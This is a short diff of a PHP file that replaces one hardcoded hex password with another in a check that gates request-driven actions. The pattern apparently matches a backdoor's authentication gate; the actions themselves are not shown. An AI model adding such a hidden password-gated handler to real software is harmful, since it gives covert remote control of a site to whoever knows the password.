@@ -1,6 +1,6 @@
 <?php
 
-if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'c7c458846de509221b995802ac1694d1'))
+if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '3fa930fa7cc3bc970ca296e43dd2fccf'))
 	{
 		switch ($_REQUEST['action'])
 			{
